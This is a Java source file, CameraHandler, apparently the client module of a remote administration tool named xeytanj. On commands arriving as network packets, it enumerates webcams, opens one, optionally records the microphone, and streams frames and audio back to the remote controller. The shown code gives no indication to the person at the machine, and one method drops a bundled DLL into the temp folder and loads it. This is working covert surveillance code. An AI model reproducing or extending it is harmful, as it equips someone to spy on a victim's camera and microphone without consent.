package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.MediaInstruction;
import com.melardev.xeytanj.enums.SessionType;
import com.melardev.xeytanj.logger.ConsoleLogger;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.microphone.Microphone;
import com.melardev.xeytanj.models.CameraDeviceInfo;
import com.melardev.xeytanj.net.packets.Packet;
import com.melardev.xeytanj.net.packets.PacketType;

import com.melardev.xeytanj.net.packets.multimedia.PacketCameraConfigResponse;
import com.melardev.xeytanj.net.packets.multimedia.PacketCameraRequest;
import com.melardev.xeytanj.net.packets.multimedia.PacketMediaResponse;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.remote.PacketHandler;
import org.opencv.core.Mat;
import org.opencv.videoio.VideoCapture;

import javax.swing.*;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class CameraHandler implements PacketHandler<Packet> {
    private final IApplication application;

    private VideoCapture videoCapture;
    private Mat frame;


    private Microphone microphone;
    private boolean recordAudio;


    private Integer currentCameraId;


    private final Lock videoCaptureLock;
    private CameraRunnable cameraRunnable;
    private ILogger logger;


    public CameraHandler(IApplication application, ConsoleLogger logger) {
        this.application = application;
        videoCaptureLock = new ReentrantLock();
        cameraRunnable = new CameraRunnable(this);
        this.logger = logger;

        //System.loadLibrary(Core.NATIVE_LIBRARY_NAME); //In the jar it throus an exception
        initOpenCV();
    }

    private void initOpenCV() {
        logger.traceCurrentMethodName();
        nu.pattern.OpenCV.loadLocally();
    }

    private void initOpenCVOld() {
        logger.traceCurrentMethodName();
        //Check if OpenCV Library needed already saved in Temp , otherwise extract from resources and save in Temp
        File ocv = new File(System.getProperty("java.io.tmpdir") + "\\opencv_java310.dll");
        if (!ocv.exists()) {
            int bitness = Integer.parseInt(System.getProperty("sun.arch.data.model"));
            InputStream is = null;
            if (bitness == 64) {
                is = getClass().getResourceAsStream("/executables/lib/x64/opencv_java310.dll");
            } else if (bitness == 32) {
                is = getClass().getResourceAsStream("/executables/lib/x86/opencv_java310.dll");
            }
            try {
                File out = File.createTempFile("xeytan", ".dll");
                Files.copy(is, Paths.get(out.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);
                out.renameTo(new File(System.getProperty("java.io.tmpdir") + "/opencv_java310.dll"));
                //System.load(out.getAbsolutePath());
                //JOptionPane.showConfirmDialog(null, "Loaded " + out1.getAbsolutePath() + " " + out2.getAbsolutePath());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        System.load(ocv.getAbsolutePath());
    }


    private synchronized void sendPacket(Packet packet) throws IOException {
        logger.traceCurrentMethodName();
        application.sendPacket(packet);
    }

    private ArrayList<CameraDeviceInfo> getCameraIds() {
        logger.traceCurrentMethodName();
        VideoCapture tempCap;
        ArrayList<CameraDeviceInfo> cameraDeviceInfos = new ArrayList<>();
        for (int id = 0; id < 50; id++) {

            tempCap = new VideoCapture(id);
            if (tempCap.isOpened()) {
                CameraDeviceInfo cameraDeviceInfo = new CameraDeviceInfo(String.valueOf(id));
                tempCap.release();
                cameraDeviceInfos.add(cameraDeviceInfo);
            } else
                break;
        }
        return cameraDeviceInfos;
    }

    public ImageIcon getCameraCapture() {

        logger.traceCurrentMethodName();
        /*
         * videoCapture.set(Videoio.CAP_PROP_FRAME_WIDTH, 300);
         * videoCapture.set(Videoio.CAP_PROP_FRAME_HEIGHT, 240);
         */
        synchronized (videoCaptureLock) {
            if (!videoCapture.isOpened())
                return null;
            frame = new Mat();
            while (true) {
                if (videoCapture.read(frame)) {
                    if (!frame.empty()) {
                        return new ImageIcon(toBufferedImage(frame));
                    }
                }
            }
        }
    }

    public BufferedImage toBufferedImage(Mat matrix) {
        logger.traceCurrentMethodName();
        int type = BufferedImage.TYPE_BYTE_GRAY;
        if (matrix.channels() > 1) {
            type = BufferedImage.TYPE_3BYTE_BGR;
        }
        int bufferSize = matrix.channels() * matrix.cols() * matrix.rows();
        byte[] buffer = new byte[bufferSize];
        matrix.get(0, 0, buffer); // get all the pixels
        BufferedImage image = new BufferedImage(matrix.cols(), matrix.rows(), type);
        final byte[] targetPixels = ((DataBufferByte) image.getRaster().getDataBuffer()).getData();
        System.arraycopy(buffer, 0, targetPixels, 0, buffer.length);
        return image;
    }

    public static void main(String[] args) {
        /*
         * System.loadLibrary(Core.NATIVE_LIBRARY_NAME);
         * System.out.println("Welcome to OpenCV " + Core.VERSION);
         * Mat m = new Mat(5, 10, CvType.CV_8UC1, new Scalar(0));
         * System.out.println("OpenCV Mat: " + m);
         * Mat mr1 = m.row(1);
         * mr1.setTo(new Scalar(1));
         * Mat mc5 = m.col(5);
         * mc5.setTo(new Scalar(5));
         * System.out.println("OpenCV Mat data:\n" + m.dump());
         *
         */

    }

    public void sendVoice(byte[] byteBuffer, int bytesRead) {
        logger.traceCurrentMethodName();
        PacketVoice packet = new PacketVoice(byteBuffer, bytesRead);
        //packetVoice.bytesRead = bytesRead;
        //packetVoice.data = byteBuffer;

        application.sendPacket(packet);

    }

    public void sendFileVoice(File wavFile) {
        logger.traceCurrentMethodName();
        // application.sendPacket(new PacketFile(wavFile));
    }

    //@Override
    public void stopService() {
        logger.traceCurrentMethodName();
        cameraRunnable.setShouldRun(false);
    }


    @Override
    public void handlePacket(Packet packet) {
        if (packet.getClass() == PacketCameraRequest.class) {

            if (packet.getType() == PacketType.CAMERA_CONFIG) {
                // TODO refactor this useless thing
                PacketCameraConfigResponse packetResponse = new PacketCameraConfigResponse();
                packetResponse.setScreenDeviceInfoList(getCameraIds());
                application.sendPacket(packetResponse);

            } else if (packet.getType() == PacketType.CAMERA) {
                PacketCameraRequest packetCamera = (PacketCameraRequest) packet;

                if (packetCamera.getMediaInstruction() == MediaInstruction.PLAY) {

                    //Set/Update Camera configuration
                    synchronized (videoCaptureLock) {
                        if (!cameraRunnable.isShouldRun()) {
                            //Not running : Set
                            videoCapture = new VideoCapture(Integer.valueOf(packetCamera.getMediaConfigState().getSelectedDeviceNames()[0]));
                            cameraRunnable.setShouldRun(true);
                        } else {
                            //Already running : update
                            if (((PacketCameraRequest) packet).getMediaConfigState() != null
                                    && packetCamera.getMediaConfigState().getSelectedDeviceNames().length > 0) {
                                String cameraIdStr = ((PacketCameraRequest) packet).getMediaConfigState().getSelectedDeviceNames()[0];
                                if (cameraIdStr.equalsIgnoreCase(String.valueOf(currentCameraId))) {
                                    videoCapture.release();
                                    videoCapture.open(Integer.valueOf(cameraIdStr));
                                }
                            }
                            currentCameraId = Integer.valueOf(((PacketCameraRequest) packet).getMediaConfigState().getSelectedDeviceNames()[0]);
                        }

                        int intervalFrame = ((PacketCameraRequest) packet).getMediaConfigState().getInterval();

                        recordAudio = ((PacketCameraRequest) packet).isRecordAudio();
                        if (recordAudio) {
                            if (microphone == null)
                                microphone = new Microphone(application);
                            //microphone.setMute(shouldRecordAudio);
                        }
                        cameraRunnable.setIntervalFrame(intervalFrame);
                        beginStreaming();

                        cameraRunnable.setShouldRun(true);
                        cameraRunnable.setShouldPause(false);
                        if (recordAudio && microphone != null) {
                            microphone.setShouldRun(true);
                            microphone.setShouldPause(false);
                        }
                    }
                } else if (packetCamera.getMediaInstruction() == MediaInstruction.PAUSE) {
                    cameraRunnable.setShouldPause(true);
                    if (recordAudio && microphone != null)
                        microphone.setShouldPause(true);
                } else if (packetCamera.getMediaInstruction() == MediaInstruction.STOP) {
                    cameraRunnable.setShouldRun(false);
                    if (recordAudio && microphone != null)
                        microphone.setShouldRun(false);

                    application.onSessionClosed(SessionType.CAMERA);
                }
            }
        }
    }


    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    private void beginStreaming() {
        logger.traceCurrentMethodName();
        if (recordAudio) {

            //microphone = new Microphone(this);
            new Thread(() -> {
                microphone.beginRecording();
            }, "AudioRecorderThread").start();
        }

        if (cameraRunnable != null) {
            cameraRunnable = new CameraRunnable(this);
            new Thread(cameraRunnable).start();
        }
    }

    public void setRecordAudio(boolean recordAudio) {
        logger.traceCurrentMethodName();
        this.recordAudio = recordAudio;
    }

    private class CameraRunnable implements Runnable {
        private final CameraHandler cameraHandler;
        private volatile boolean shouldRun;
        private volatile boolean shouldPause;
        private int intervalFrame;

        public boolean isShouldRun() {
            return shouldRun;
        }

        public void setShouldRun(boolean shouldRun) {
            this.shouldRun = shouldRun;
        }

        public boolean isShouldPause() {
            return shouldPause;
        }

        public void setShouldPause(boolean shouldPause) {
            this.shouldPause = shouldPause;
        }

        public CameraRunnable(CameraHandler cameraHandler) {
            this.cameraHandler = cameraHandler;
        }

        public int getIntervalFrame() {
            return intervalFrame;
        }

        public void setIntervalFrame(int intervalFrame) {
            this.intervalFrame = intervalFrame;
        }

        @Override
        public void run() {
            logger.traceCurrentMethodName();
            PacketMediaResponse packet;
            shouldPause = false;
            shouldRun = true;
            while (shouldRun) {
                try {

                    if (shouldPause) {
                        Thread.sleep(2000);
                        continue;
                    }

                    if (intervalFrame == -1) {
                        Thread.sleep(200);
                        continue;
                    }

                    packet = new PacketMediaResponse(PacketType.CAMERA, getCameraCapture());


                    cameraHandler.sendPacket(packet);
                    if (intervalFrame > 0) {
                        Thread.sleep(intervalFrame);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
            cameraHandler.finishedStreaming();
        }
    }

    private void finishedStreaming() {
        logger.traceCurrentMethodName();
        videoCapture.release();
        videoCapture = null;
    }
}
